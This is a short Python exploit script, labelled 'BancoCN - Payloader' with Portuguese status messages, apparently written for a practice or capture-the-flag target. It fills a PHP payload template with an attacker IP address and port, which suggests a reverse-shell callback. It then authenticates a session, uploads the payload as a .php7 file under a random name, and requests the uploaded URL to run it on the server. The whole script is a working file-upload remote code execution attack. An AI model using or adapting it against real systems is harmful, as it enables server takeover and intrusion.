from cn import Context
from json import load
from requests import get
from utils import randomString


print("** BancoCN - Payloader")

with open('payloader_base.php', 'r') as input:
   json = {}
   with open("conf.json", 'r') as f:
     json = load(f)
   with open('payload.php7', 'w') as output:
      output.write(input.read().replace("%as_ip%", json['ip_addr']).replace("%as_port%", str(json['port'])))

ctx = Context()

print(" * Autenticando SESSID")
ctx.authenticate()

print(" * Fazendo Upload")

url = ctx.upload(randomString(8), 'payload.php7', open('payload.php7'))

print(f" * Payloading... url={url}")
get(url)
